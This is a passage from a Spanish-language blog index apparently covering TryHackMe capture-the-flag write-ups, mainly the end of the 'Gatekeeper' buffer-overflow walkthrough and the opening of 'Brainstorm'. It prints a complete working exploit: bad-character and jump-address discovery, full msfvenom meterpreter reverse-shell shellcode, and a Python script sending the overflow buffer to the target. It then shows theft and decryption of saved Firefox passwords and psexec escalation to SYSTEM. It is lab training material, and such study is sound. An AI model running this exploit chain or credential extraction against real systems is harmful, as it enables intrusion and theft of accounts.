-a esp mona memory comparison results, item 0 address=0x020119f8 status=corruption after 9 bytes badchars=00 0a type=normal location=stack repito el proceso anterior pero esta vez con el caracter \\x0a, asegurandome de que esos caracteres no se incluyen en el payload enviado.\n!mona bytearray -b \u0026#34;\\x00\\x0a\u0026#34; !mona compare -f c:\\mona\\gatekeeper\\\\bytearray.bin -a esp mona memory comparison results, item 0 address=0x009919f8 status=unmodified badchars= type=normal location=stack ahora la comparación no muestra ningún caracter y el status es unmodified, por lo que puedo asegurar que el caracter \\x0a no se puede enviar al binario. lo siguiente será buscar el punto de salto para poder saltar a mi payload. para ello, ejecuto el comando !mona jmp -r esp -cpb \u0026ldquo;\\x00\\x0a\u0026rdquo; para buscar los puntos de salto que no contengan los caracteres \\x00 y \\x0a. en este caso, el punto de salto que voy a usar es 080414c3.\n!mona jmp -r esp -cpb \u0026#34;\\x00\\x0a\u0026#34; 0badf00d !mona jmp -r esp -cpb \u0026#34;\\x00\\x0a\u0026#34; ---------- mona command started on 2023-10-01 22:27:39 (v2.0, rev 634) ---------- 0badf00d [+] processing arguments and criteria 0badf00d - pointer access level : x 0badf00d - bad char filter will be applied to pointers : \u0026#34;\\x00\\x0a\u0026#34; 0badf00d [+] generating module info table, hang on... 0badf00d - processing modules 0badf00d - done. let\u0026#39;s rock \u0026#39;n roll. 0badf00d [+] querying 1 modules 0badf00d - querying module gatekeeper.exe 74950000 modules c:\\windows\\system32\\wshtcpip.dll 0badf00d - search complete, processing results 0badf00d [+] preparing output file \u0026#39;jmp.txt\u0026#39; 0badf00d - (re)setting logfile c:\\mona\\gatekeeper\\jmp.txt 0badf00d [+] writing results to c:\\mona\\gatekeeper\\jmp.txt 0badf00d - number of pointers of type \u0026#39;jmp esp\u0026#39; : 2 0badf00d [+] results : 080414c3 0x080414c3 : jmp esp | {page_execute_read} [gatekeeper.exe] aslr: false, rebase: false, safeseh: true, cfg: false, os: false, v-1.0- (c:\\bof\\gatekeeper\\gatekeeper.exe), 0x8000 080416bf 0x080416bf : jmp esp | {page_execute_read} [gatekeeper.exe] aslr: false, rebase: false, safeseh: true, cfg: false, os: false, v-1.0- (c:\\bof\\gatekeeper\\gatekeeper.exe), 0x8000 0badf00d found a total of 2 pointers identifico dos puntos de salto. me quedo con uno de ellos y me lo llevo para usarlo en mi exploit. lo paso por un pequeño script de python para obtener el valor en little endian.\nimport sys if len(sys.argv) != 2: print(\u0026#34;[*] run:\\n\\tjump_address.py \u0026lt;jump_point_address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] n1 = address[0:2] n2 = address[2:4] n3 = address[4:6] n4 = address[6:8] print(\u0026#34;\\nretn = \u0026#34; + \u0026#34;\\\u0026#34;\\\\x\u0026#34; + n4 + \u0026#34;\\\\x\u0026#34; + n3 +\u0026#34;\\\\x\u0026#34; + n2 +\u0026#34;\\\\x\u0026#34; + n1+\u0026#34;\\\u0026#34;\u0026#34;) ❯ python3 jump.py 080414c3 retn = \u0026#34;\\xc3\\x14\\x04\\x08\u0026#34; con el valor del punto de salto, actualizo el script de python y compruebo que puedo saltar a mi payload. en el registro eip se puede ver el valor 080414c3 que es el punto de salto que he usado en el payload.\nprueba del exploit antes de atacar la máquina objetivo, voy a probar con mi máquina de pruebas. usando msfvenom, genero un payload de meterpreter que se conecte a mi equipo en el puerto 4444 y lo meto en el script del exploit.\n❯ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 exitfunc=process -b \u0026#34;\\x00\\xa0\u0026#34; -f c [-] no platform was selected, choosing msf::module::platform::windows from the payload [-] no arch selected, selecting arch: x86 from the payload found 12 compatible encoders attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 381 (iteration=0) x86/shikata_ga_nai chosen with final size 381 payload size: 381 bytes final size of c file: 1632 bytes unsigned char buf[] = \u0026#34;\\xbf\\xe1\\xb8\\x2d\\x7c\\xdd\\xc6\\xd9\\x74\\x24\\xf4\\x5b\\x2b\\xc9\u0026#34; \u0026#34;\\xb1\\x59\\x31\\x7b\\x14\\x83\\xeb\\xfc\\x03\\x7b\\x10\\x03\\x4d\\xd1\u0026#34; \u0026#34;\\x94\\x4c\\xae\\x2a\\x65\\x32\\x9e\\xf8\\x01\\x39\\xb2\\xcc\\x42\\x6f\u0026#34; \u0026#34;\\x3f\\xa6\\x07\\x9b\\xb6\\x5d\\xa8\\x14\\x82\\xbb\\x3c\\x28\\x3b\\xf5\u0026#34; \u0026#34;\\xbd\\xfd\\xfb\\x59\\x7d\\x9c\\x87\\xa3\\x52\\x7e\\xb9\\x6b\\xa7\\x7f\u0026#34; \u0026#34;\\xfe\\x3d\\xcd\\x90\\x52\\xe9\\xa6\\x3c\\x43\\x9e\\xfb\\xfc\\x62\\x70\u0026#34; \u0026#34;\\x70\\xbc\\x1c\\xf5\\x47\\x48\\x91\\xf4\\x97\\x3b\\x61\\xef\\x9c\\x63\u0026#34; \u0026#34;\\x52\\x0e\\x70\\xc3\\x17\\xd9\\x02\\xdf\\x5e\\xeb\\x15\\x94\\x55\\x80\u0026#34; \u0026#34;\\xeb\\x7c\\xa4\\x56\\x2a\\x4f\\xca\\xfa\\xac\\x88\\xed\\xe2\\xda\\xe2\u0026#34; \u0026#34;\\x0d\\x9e\\xdc\\x31\\x6f\\x44\\x68\\xa5\\xd7\\x0f\\xca\\x01\\xe9\\xdc\u0026#34; \u0026#34;\\x8d\\xc2\\xe5\\xa9\\xda\\x8c\\xe9\\x2c\\x0e\\xa7\\x16\\xa4\\xb1\\x67\u0026#34; \u0026#34;\\x9f\\xfe\\x95\\xa3\\xfb\\xa5\\xb4\\xf2\\xa1\\x08\\xc8\\xe4\\x0e\\xf4\u0026#34; \u0026#34;\\x6c\\x6f\\xbc\\xe3\\x11\\x90\\x3e\\x0c\\x4c\\x06\\xf2\\xc1\\x6f\\xd6\u0026#34; \u0026#34;\\x9c\\x52\\x03\\xe4\\x03\\xc9\\x8b\\x44\\xcb\\xd7\\x4c\\xdd\\xdb\\xe7\u0026#34; \u0026#34;\\x83\\x65\\x8b\\x19\\x24\\x95\\x85\\xdd\\x70\\xc5\\xbd\\xf4\\xf8\\x8e\u0026#34; \u0026#34;\\x3d\\xf8\\x2c\\x3a\\x34\\x6e\\x0f\\x12\\x70\\x6f\\xe7\\x60\\x81\\x7e\u0026#34; \u0026#34;\\xab\\xed\\x67\\xd0\\x03\\xbd\\x37\\x91\\xf3\\x7d\\xe8\\x79\\x1e\\x72\u0026#34; \u0026#34;\\xd7\\x9a\\x21\\x59\\x70\\x30\\xce\\x37\\x28\\xad\\x77\\x12\\xa2\\x4c\u0026#34; \u0026#34;\\x77\\x89\\xce\\x4f\\xf3\\x3b\\x2e\\x01\\xf4\\x4e\\x3c\\x76\\x63\\xb0\u0026#34; \u0026#34;\\xbc\\x87\\x06\\xb0\\xd6\\x83\\x80\\xe7\\x4e\\x8e\\xf5\\xcf\\xd0\\x71\u0026#34; \u0026#34;\\xd0\\x4c\\x16\\x8d\\xa5\\x64\\x6c\\xb8\\x33\\xc8\\x1a\\xc5\\xd3\\xc8\u0026#34; \u0026#34;\\xda\\x93\\xb9\\xc8\\xb2\\x43\\x9a\\x9b\\xa7\\x8b\\x37\\x88\\x7b\\x1e\u0026#34; \u0026#34;\\xb8\\xf8\\x28\\x89\\xd0\\x06\\x16\\xfd\\x7e\\xf9\\x7d\\x7d\\x78\\x05\u0026#34; \u0026#34;\\x03\\xaa\\x21\\x6d\\xfb\\xea\\xd1\\x6d\\x91\\xea\\x81\\x05\\x6e\\xc4\u0026#34; \u0026#34;\\x2e\\xe5\\x8f\\xcf\\x66\\x6d\\x05\\x9e\\xc5\\x0c\\x1a\\x8b\\x88\\x90\u0026#34; \u0026#34;\\x1b\\x38\\x11\\x23\\x61\\x31\\xa6\\xc4\\x96\\x5b\\xc3\\xc5\\x96\\x63\u0026#34; \u0026#34;\\xf5\\xfa\\x40\\x5a\\x83\\x3d\\x51\\xd9\\x9c\\x08\\xf4\\x48\\x37\\x72\u0026#34; \u0026#34;\\xaa\\x8b\\x12\u0026#34;; pongo en marcha el listener de metasploit y lanzo el exploit.\nmsf6 \u0026gt; use exploit/multi/handler [*] using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set lhost 192.168.56.1 lhost =\u0026gt; 192.168.56.1 msf6 exploit(multi/handler) \u0026gt; show options module options (exploit/multi/handler): name current setting required description ---- --------------- -------- ----------- payload options (windows/meterpreter/reverse_tcp): name current setting required description ---- --------------- -------- ----------- exitfunc process yes exit technique (accepted: \u0026#39;\u0026#39;, seh, thread, process, none) lhost 192.168.56.1 yes the listen address (an interface may be specified) lport 4444 yes the listen port exploit target: id name -- ---- 0 wildcard target view the full module info with the info, or info -d command. msf6 exploit(multi/handler) \u0026gt; run [*] started reverse tcp handler on 192.168.56.1:4444 [*] sending stage (175686 bytes) to 192.168.56.101 [*] meterpreter session 1 opened (192.168.56.1:4444 -\u0026gt; 192.168.56.101:49426) at 2023-10-01 22:35:32 +0200 meterpreter \u0026gt; getuid server username: usuario-pc\\usuario meterpreter \u0026gt; getsystem ...got system via technique 1 (named pipe impersonation (in memory/admin)). meterpreter \u0026gt; getuid server username: nt authority\\system meterpreter \u0026gt; la prueba ha sido un éxito, por lo que ya puedo atacar la máquina objetivo.\nexplotación de la máquina objetivo genero un nuevo payload con el lhost y lport apropiado. en este caso me decido por un puerto standar que no esté siendo usado, como es el 443.\n❯ msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=443 exitfunc=process -b \u0026#34;\\x00\\xa0\u0026#34; -f c [-] no platform was selected, choosing msf::module::platform::windows from the payload [-] no arch selected, selecting arch: x86 from the payload found 12 compatible encoders attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 381 (iteration=0) x86/shikata_ga_nai chosen with final size 381 payload size: 381 bytes final size of c file: 1632 bytes unsigned char buf[] = \u0026#34;\\xbf\\xf9\\xc3\\x28\\xb4\\xda\\xc6\\xd9\\x74\\x24\\xf4\\x5a\\x33\\xc9\u0026#34; \u0026#34;\\xb1\\x59\\x31\\x7a\\x14\\x03\\x7a\\x14\\x83\\xea\\xfc\\x1b\\x36\\xd4\u0026#34; \u0026#34;\\x5c\\x54\\xb9\\x25\\x9d\\x0a\\x8b\\xf7\\x14\\x2f\\x8f\\x7c\\x74\\x9f\u0026#34; \u0026#34;\\xdb\\xd1\\x75\\x54\\x89\\xc1\\x8a\\xdd\\x64\\xcc\\x1f\\x53\\x51\\x21\u0026#34; \u0026#34;\\xdf\\xa2\\x61\\xed\\x23\\xa5\\x1d\\xec\\x77\\x05\\x1f\\x3f\\x8a\\x44\u0026#34; \u0026#34;\\x58\\x89\\xe0\\xa9\\x34\\x81\\x59\\x25\\x32\\xd7\\x61\\x44\\x94\\x8f\u0026#34; \u0026#34;\\x12\\x06\\x6c\\xb5\\xe5\\xf2\\xc0\\xb4\\x35\\x71\\x80\\x96\\x3e\\xcd\u0026#34; \u0026#34;\\x29\\x87\\x41\\x1e\\xcc\\xee\\x36\\x9c\\xfe\\x0f\\xff\\x57\\x34\\x7b\u0026#34; \u0026#34;\\x01\\xb1\\x04\\xbb\\xae\\xfc\\xa8\\x36\\xae\\x39\\x0e\\xa9\\xc5\\x31\u0026#34; \u0026#34;\\x6c\\x54\\xde\\x82\\x0e\\x82\\x6b\\x14\\xa8\\x41\\xcb\\xf0\\x48\\x85\u0026#34; \u0026#34;\\x8a\\x73\\x46\\x62\\xd8\\xdb\\x4b\\x75\\x0d\\x50\\x77\\xfe\\xb0\\xb6\u0026#34; \u0026#34;\\xf1\\x44\\x97\\x12\\x59\\x1e\\xb6\\x03\\x07\\xf1\\xc7\\x53\\xef\\xae\u0026#34; \u0026#34;\\x6d\\x18\\x02\\xb8\\x12\\xe1\\xdc\\xc5\\x4e\\x75\\x10\\x08\\x71\\x85\u0026#34; \u0026#34;\\x3e\\x1b\\x02\\xb7\\xe1\\xb7\\x8c\\xfb\\x6a\\x1e\\x4a\\x8a\\x7d\\xa1\u0026#34; \u0026#34;\\x84\\x34\\xed\\x5f\\x25\\x44\\x27\\xa4\\x71\\x14\\x5f\\x0d\\xfa\\xff\u0026#34; \u0026#34;\\x9f\\xb2\\x2f\\x95\\x95\\x24\\xda\\x67\\x98\\x0c\\xb2\\x75\\xdc\\x7d\u0026#34; \u0026#34;\\x1f\\xf0\\x3a\\x2d\\xcf\\x52\\x93\\x8e\\xbf\\x12\\x43\\x67\\xaa\\x9d\u0026#34; \u0026#34;\\xbc\\x97\\xd5\\x74\\xd5\\x32\\x3a\\x20\\x8d\\xaa\\xa3\\x69\\x45\\x4a\u0026#34; \u0026#34;\\x2b\\xa4\\x23\\x4c\\xa7\\x4c\\xd3\\x03\\x40\\x25\\xc7\\x74\\x37\\xc5\u0026#34; \u0026#34;\\x17\\x85\\xd2\\xc5\\x7d\\x81\\x74\\x92\\xe9\\x8b\\xa1\\xd4\\xb5\\x74\u0026#34; \u0026#34;\\x84\\x67\\xb1\\x8b\\x59\\x51\\xc9\\xba\\xcf\\xdd\\xa5\\xc2\\x1f\\xdd\u0026#34; \u0026#34;\\x35\\x95\\x75\\xdd\\x5d\\x41\\x2e\\x8e\\x78\\x8e\\xfb\\xa3\\xd0\\x1b\u0026#34; \u0026#34;\\x04\\x95\\x85\\x8c\\x6c\\x1b\\xf3\\xfb\\x32\\xe4\\xd6\\x7f\\x34\\x1a\u0026#34; \u0026#34;\\xa4\\x57\\x9d\\x72\\x56\\xe8\\x1d\\x82\\x3c\\xe8\\x4d\\xea\\xcb\\xc7\u0026#34; \u0026#34;\\x62\\xda\\x34\\xc2\\x2a\\x72\\xbe\\x83\\x99\\xe3\\xbf\\x89\\x7c\\xbd\u0026#34; \u0026#34;\\xc0\\x3e\\xa5\\x4e\\xba\\x4f\\x5a\\xaf\\x3b\\x46\\x3f\\xb0\\x3b\\x66\u0026#34; \u0026#34;\\x41\\x8d\\xed\\x5f\\x37\\xd0\\x2d\\xe4\\x48\\x67\\x13\\x4d\\xc3\\x87\u0026#34; \u0026#34;\\x07\\x8d\\xc6\u0026#34;; actualizo el script de python con el nuevo payload. lanzo el exploit y compruebo que se ha obtenido una sesión de meterpreter.\nimport socket ip = \u0026#34;10.10.223.27\u0026#34; port = 31337 prefix = \u0026#34;k3ss \u0026#34; offset = 141 overflow = \u0026#34;a\u0026#34; * offset retn = \u0026#34;\\xc3\\x14\\x04\\x08\u0026#34; padding = \u0026#34;\\x90\u0026#34; * 16 payload = ( \u0026#34;\\xbf\\xf9\\xc3\\x28\\xb4\\xda\\xc6\\xd9\\x74\\x24\\xf4\\x5a\\x33\\xc9\u0026#34; \u0026#34;\\xb1\\x59\\x31\\x7a\\x14\\x03\\x7a\\x14\\x83\\xea\\xfc\\x1b\\x36\\xd4\u0026#34; \u0026#34;\\x5c\\x54\\xb9\\x25\\x9d\\x0a\\x8b\\xf7\\x14\\x2f\\x8f\\x7c\\x74\\x9f\u0026#34; \u0026#34;\\xdb\\xd1\\x75\\x54\\x89\\xc1\\x8a\\xdd\\x64\\xcc\\x1f\\x53\\x51\\x21\u0026#34; \u0026#34;\\xdf\\xa2\\x61\\xed\\x23\\xa5\\x1d\\xec\\x77\\x05\\x1f\\x3f\\x8a\\x44\u0026#34; \u0026#34;\\x58\\x89\\xe0\\xa9\\x34\\x81\\x59\\x25\\x32\\xd7\\x61\\x44\\x94\\x8f\u0026#34; \u0026#34;\\x12\\x06\\x6c\\xb5\\xe5\\xf2\\xc0\\xb4\\x35\\x71\\x80\\x96\\x3e\\xcd\u0026#34; \u0026#34;\\x29\\x87\\x41\\x1e\\xcc\\xee\\x36\\x9c\\xfe\\x0f\\xff\\x57\\x34\\x7b\u0026#34; \u0026#34;\\x01\\xb1\\x04\\xbb\\xae\\xfc\\xa8\\x36\\xae\\x39\\x0e\\xa9\\xc5\\x31\u0026#34; \u0026#34;\\x6c\\x54\\xde\\x82\\x0e\\x82\\x6b\\x14\\xa8\\x41\\xcb\\xf0\\x48\\x85\u0026#34; \u0026#34;\\x8a\\x73\\x46\\x62\\xd8\\xdb\\x4b\\x75\\x0d\\x50\\x77\\xfe\\xb0\\xb6\u0026#34; \u0026#34;\\xf1\\x44\\x97\\x12\\x59\\x1e\\xb6\\x03\\x07\\xf1\\xc7\\x53\\xef\\xae\u0026#34; \u0026#34;\\x6d\\x18\\x02\\xb8\\x12\\xe1\\xdc\\xc5\\x4e\\x75\\x10\\x08\\x71\\x85\u0026#34; \u0026#34;\\x3e\\x1b\\x02\\xb7\\xe1\\xb7\\x8c\\xfb\\x6a\\x1e\\x4a\\x8a\\x7d\\xa1\u0026#34; \u0026#34;\\x84\\x34\\xed\\x5f\\x25\\x44\\x27\\xa4\\x71\\x14\\x5f\\x0d\\xfa\\xff\u0026#34; \u0026#34;\\x9f\\xb2\\x2f\\x95\\x95\\x24\\xda\\x67\\x98\\x0c\\xb2\\x75\\xdc\\x7d\u0026#34; \u0026#34;\\x1f\\xf0\\x3a\\x2d\\xcf\\x52\\x93\\x8e\\xbf\\x12\\x43\\x67\\xaa\\x9d\u0026#34; \u0026#34;\\xbc\\x97\\xd5\\x74\\xd5\\x32\\x3a\\x20\\x8d\\xaa\\xa3\\x69\\x45\\x4a\u0026#34; \u0026#34;\\x2b\\xa4\\x23\\x4c\\xa7\\x4c\\xd3\\x03\\x40\\x25\\xc7\\x74\\x37\\xc5\u0026#34; \u0026#34;\\x17\\x85\\xd2\\xc5\\x7d\\x81\\x74\\x92\\xe9\\x8b\\xa1\\xd4\\xb5\\x74\u0026#34; \u0026#34;\\x84\\x67\\xb1\\x8b\\x59\\x51\\xc9\\xba\\xcf\\xdd\\xa5\\xc2\\x1f\\xdd\u0026#34; \u0026#34;\\x35\\x95\\x75\\xdd\\x5d\\x41\\x2e\\x8e\\x78\\x8e\\xfb\\xa3\\xd0\\x1b\u0026#34; \u0026#34;\\x04\\x95\\x85\\x8c\\x6c\\x1b\\xf3\\xfb\\x32\\xe4\\xd6\\x7f\\x34\\x1a\u0026#34; \u0026#34;\\xa4\\x57\\x9d\\x72\\x56\\xe8\\x1d\\x82\\x3c\\xe8\\x4d\\xea\\xcb\\xc7\u0026#34; \u0026#34;\\x62\\xda\\x34\\xc2\\x2a\\x72\\xbe\\x83\\x99\\xe3\\xbf\\x89\\x7c\\xbd\u0026#34; \u0026#34;\\xc0\\x3e\\xa5\\x4e\\xba\\x4f\\x5a\\xaf\\x3b\\x46\\x3f\\xb0\\x3b\\x66\u0026#34; \u0026#34;\\x41\\x8d\\xed\\x5f\\x37\\xd0\\x2d\\xe4\\x48\\x67\\x13\\x4d\\xc3\\x87\u0026#34; \u0026#34;\\x07\\x8d\\xc6\u0026#34;) postfix = \u0026#34;\u0026#34; buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.af_inet, socket.sock_stream) try: s.connect((ip, port)) print(\u0026#34;sending evil buffer...\u0026#34;) s.send(bytes(buffer + \u0026#34;\\r\\n\u0026#34;, \u0026#34;latin-1\u0026#34;)) # s.recv(1024) print(\u0026#34;done!\u0026#34;) except exception as e: print(f\u0026#34;an error occurred: {e}\u0026#34;) con el acceso logrado, lo primero que hago es buscar el fichero user.txt. lo encuentro sin probremas con el comando search -f user.*.txt\nescalada de privilegios ahora hay que encontrar una forma de escalar privilegios. compruebo que el proceso en el que estoy no tiene privilegios de administrador, y no puedo migrar a otro proceso con privilegios de administrador. pruego a ejecutar el comando getsystem, pero no funciona, necesito otra opción.\npor suerte, al entrar en el objetivo, he visto un enlace directo a firefox, algo que puedo aproevhar si obtengo los ficheros key3.db y logins.json. para ello, ejecuto el comando search -f key.*.db y search -f logins.json. el fichero key3.db se encuentra en c:\\users\\usuario\\appdata\\roaming\\mozilla\\firefox\\profiles\\ljfn812a.default-release y el fichero logins.json se encuentra en c:\\users\\usuario\\appdata\\roaming\\mozilla\\firefox\\profiles\\ljfn812a.default-release.\nmeterpreter \u0026gt; cd c:\\\\users\\\\natbat\\\\appdata\\\\roaming\\\\mozilla\\\\firefox\\\\profiles meterpreter \u0026gt; ls listing: c:\\users\\natbat\\appdata\\roaming\\mozilla\\firefox\\profiles ================================================================= mode size type last modified name ---- ---- ---- ------------- ---- 040777/rwxrwxrwx 16384 dir 2020-05-15 04:45:02 +0200 ljfn812a.default-release 040777/rwxrwxrwx 0 dir 2020-04-21 23:00:37 +0200 rajfzh3y.default aunque no se puede leer el fichero key3.db, si que se puede leer el fichero logins.json. en este fichero se encuentran las credenciales de usuario y contraseña de firefox. para poder leer el fichero, lo descargo a mi equipo con el comando download. una vez obtenidos, los paso a mi equipo y los analizo con el script de python firepwd.py. el script se puede encontrar en:\nhttps://github.com/lclevy/firepwd\nla descargo y la ejecuto con python firepwd.py. el script me devuelve las credenciales de usuario y contraseña de firefox.\n❯ cd firepwd ❯ ll .rw-r--r-- k3ss k3ss 14 kb sun oct 1 23:15:43 2023  firepwd.py .rw-r--r-- k3ss k3ss 288 kb sun oct 1 23:16:43 2023  key4.db .rw-r--r-- k3ss k3ss 18 kb sun oct 1 23:15:43 2023  license .rw-r--r-- k3ss k3ss 600 b sun oct 1 23:17:35 2023  logins.json drwxr-xr-x k3ss k3ss 4.0 kb sun oct 1 23:15:43 2023  mozilla_db .rw-r--r-- k3ss k3ss 120 kb sun oct 1 23:15:43 2023  mozilla_pbe.pdf .rw-r--r-- k3ss k3ss 183 kb sun oct 1 23:15:43 2023  mozilla_pbe.svg .rw-r--r-- k3ss k3ss 7.0 kb sun oct 1 23:15:43 2023  readme.md .rw-r--r-- k3ss k3ss 34 b sun oct 1 23:15:43 2023  requirements.txt ❯ python firepwd.py globalsalt: b\u0026#39;2d45b7ac4e42209a23235ecf825c018e0382291d\u0026#39; sequence { sequence { objectidentifier 1.2.840.113549.1.5.13 pkcs5 pbes2 sequence { sequence { objectidentifier 1.2.840.113549.1.5.12 pkcs5 pbkdf2 sequence { octetstring b\u0026#39;9e0554a19d22a773d0c5497efe7a80641fa25e2e73b2ddf3fbbca61d801c116d\u0026#39; integer b\u0026#39;01\u0026#39; integer b\u0026#39;20\u0026#39; sequence { objectidentifier 1.2.840.113549.2.9 hmacwithsha256 } } } sequence { objectidentifier 2.16.840.1.101.3.4.1.42 aes256-cbc octetstring b\u0026#39;b0da1db2992a21a74e7946f23021\u0026#39; } } } octetstring b\u0026#39;a713739460522b20433f7d0b49bfabdb\u0026#39; } cleartext b\u0026#39;70617373776f72642d636865636b0202\u0026#39; password check? true sequence { sequence { objectidentifier 1.2.840.113549.1.5.13 pkcs5 pbes2 sequence { sequence { objectidentifier 1.2.840.113549.1.5.12 pkcs5 pbkdf2 sequence { octetstring b\u0026#39;f1f75a319f519506d39986e15fe90ade00280879f00ae1e036422f001afc6267\u0026#39; integer b\u0026#39;01\u0026#39; integer b\u0026#39;20\u0026#39; sequence { objectidentifier 1.2.840.113549.2.9 hmacwithsha256 } } } sequence { objectidentifier 2.16.840.1.101.3.4.1.42 aes256-cbc octetstring b\u0026#39;dbd2424eabcf4be30180860055c8\u0026#39; } } } octetstring b\u0026#39;22daf82df08cfd8aa7692b00721f870688749d57b09cb1965dde5c353589dd5d\u0026#39; } cleartext b\u0026#39;86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808\u0026#39; decrypting login/password pairs https://creds.com:b\u0026#39;mayor\u0026#39;,b\u0026#39;8cl7o1n78mdrcisv\u0026#39; el usuario es mayor y la contraseña es 8cl7o1n78mdrcisv. ahora puedo probar a ejecutar el comando getsystem. para ello, me conecto a la máquina con el usuario mayor y la contraseña 8cl7o1n78mdrcisv. una vez dentro, ejecuto el comando getsystem y compruebo que se ha escalado privilegios.\npara llevar a cabo este ataque, uso el exploit psexec de metasploit. para ello, primero busco el exploit con el comando search psexec. una vez encontrado, lo configuro con los parámetros necesarios y lo lanzo.\nmsf6 exploit(multi/handler) \u0026gt; search psexec matching modules ================ # name disclosure date rank check description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/smb/impacket/dcomexec 2018-03-19 normal no dcom exec 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal yes ms17-010 eternalromance/eternalsynergy/eternalchampion smb remote windows code execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal no ms17-010 eternalromance/eternalsynergy/eternalchampion smb remote windows command execution 3 auxiliary/scanner/smb/psexec_loggedin_users normal no microsoft windows authenticated logged in users enumeration 4 exploit/windows/smb/psexec 1999-01-01 manual no microsoft windows authenticated user code execution 5 auxiliary/admin/smb/psexec_ntdsgrab normal no psexec ntds.dit and system hive download utility 6 exploit/windows/local/current_user_psexec 1999-01-01 excellent no psexec via current user token 7 encoder/x86/service manual no register service 8 auxiliary/scanner/smb/impacket/wmiexec 2018-03-19 normal no wmi exec 9 exploit/windows/smb/webexec 2018-10-24 manual no webexec authenticated user code execution 10 exploit/windows/local/wmi 1999-01-01 excellent no windows management instrumentation (wmi) remote command execution interact with a module by name or index. for example info 10, use 10 or use exploit/windows/local/wmi msf6 exploit(multi/handler) \u0026gt; use 4 [*] no payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/smb/psexec) \u0026gt; msf6 exploit(windows/smb/psexec) \u0026gt; set lhost tun0 lhost =\u0026gt; x.x.x.x msf6 exploit(windows/smb/psexec) \u0026gt; set smbuser mayor smbuser =\u0026gt; mayor msf6 exploit(windows/smb/psexec) \u0026gt; set rhosts 10.10.223.27 rhosts =\u0026gt; 10.10.223.27 msf6 exploit(windows/smb/psexec) \u0026gt; set smbdomain gatekeeper smbdomain =\u0026gt; gatekeeper msf6 exploit(windows/smb/psexec) \u0026gt; set smbpass 8cl7o1n78mdrcisv smbpass =\u0026gt; 8cl7o1n78mdrcisv msf6 exploit(windows/smb/psexec) \u0026gt; show options msf6 exploit(windows/smb/psexec) \u0026gt; run [*] started reverse tcp handler on x.x.x.x:4444 [*] 10.10.223.27:445 - connecting to the server... [*] 10.10.223.27:445 - authenticating to 10.10.223.27:445|gatekeeper as user \u0026#39;mayor\u0026#39;... [*] 10.10.223.27:445 - selecting powershell target [*] 10.10.223.27:445 - executing the payload... [+] 10.10.223.27:445 - service start timed out, ok if running a command or non-service executable... [*] sending stage (175686 bytes) to 10.10.223.27 [*] meterpreter session 4 opened (x.x.x.x:4444 -\u0026gt; 10.10.223.27:49218) at 2023-10-01 23:30:04 +0200 meterpreter \u0026gt; getuid server username: nt authority\\system meterpreter \u0026gt; ahora que he conseguido acceso privilegiado, puedo buscar el fichero root.txt. lo encuentro en c:\\users\\mayor\\desktop\\root.txt.txt. lo leo y obtengo la flag.\nmeterpreter \u0026gt; search -f root.* found 2 results... ================== path size (bytes) modified (utc) ---- ------------ -------------- c:\\users\\mayor\\appdata\\roaming\\microsoft\\windows\\recent\\root.txt.lnk 558 2020-05-15 04:45:53 +0200 c:\\users\\mayor\\desktop\\root.txt.txt 27 2020-05-15 03:21:09 +0200 meterpreter \u0026gt; cat c:\\\\users\\\\mayor\\\\desktop\\\\root.txt.txt {th3_m4y0r_c0ngr4tul4t3s_u} meterpreter \u0026gt; conclusiones esta sala ha sido bastante más difícil que las anteriores, aunque sea de dificultad media. he tenido que investigar bastante para poder encontrar la forma de escalar privilegios usando firefox. además del script de python firepwd.py, se supone que hay una forma de hacerlo con hashcat, pero no supe como hacerlo y tampoco quise invertir mucho tiempo en ello, sabiendo que ya hay una forma de hacerlo con el script de python que es relativamente sencilla. lo aprendido durante esta sala y los apuntes que he guardado me serán de utilidad en el futuro, no me cabe duda.\n(◕‿‿◕) hack the planet! ","title":"Gatekeeper [TryHackMe]"},{"date":"2023-10-01","image":"/images/post_pics/brainstorm/brainstorm.jpeg","link":"https://k3ssdev.github.io/posts/brainstorm/","summary":"Introducción Brainstorm es una máquina virtual vulnerable de TryHackMe con un nivel de dificultad media. El objetivo es obtener acceso a la máquina y obtener el flag root.txt. Forma parte del learning path de Offensive Pentesting Path, y está dentro del bloque de \u0026ldquo;Buffer Overflow\u0026rdquo;, por lo que el objetivo es explotar un buffer overflow en una aplicación vulnerable para obtener acceso a la máquina.","tags":["Buffer Overflow","Exploit Development","Immunity Debugger","Medium","Metasploit","Meterpreter","Mona","Privilege Escalation","Python","Reverse Shell","TryHackMe","Windows"],"text":"introducción brainstorm es una máquina virtual vulnerable de tryhackme con un nivel de dificultad media. el objetivo es obtener acceso a la máquina y obtener el flag root.txt. forma parte del learning path de offensive pentesting path, y está dentro del bloque de \u0026ldquo;buffer overflow\u0026rdquo;, por lo que el objetivo es explotar un buffer overflow en una aplicación vulnerable para obtener acceso a la máquina. en este caso, la aplicación vulnerable es un servidor de chat que se ejecuta en windows, por lo que primero se debe obtener el binario de la aplicación y analizarlo con immunity debugger para encontrar la vulnerabilidad y explotarla.\nescaneo de puertos lo primero que haremos será escanear los puertos de la máquina con nmap para ver qué servicios están en ejecución y qué puertos están abiertos.\nnmap -ss --min-rate 5000 -p- -pn -v -on nmap_inicial 10.10.211.15 # nmap 7.94 scan initiated sun sep 24 12:32:12 2023 as: nmap -ss --min-rate 5000 -p- -pn -v -on nmap_inicial 10.10.211.15 increasing send delay for 10.10.211.15 from 0 to 5 due to 11 out of 14 dropped probes since last increase. nmap scan report for 10.10.211.15 host is up (0.050s latency). not shown: 65532 filtered tcp ports (no-response) port state service 21/tcp open ftp 3389/tcp open ms-wbt-server 9999/tcp open abyss read data files from: /usr/bin/../share/nmap # nmap done at sun sep 24 12:32:39 2023 -- 1 ip address (1 host up) scanned in 26.55 seconds nmap -p21,3389,9999 -sc -sv 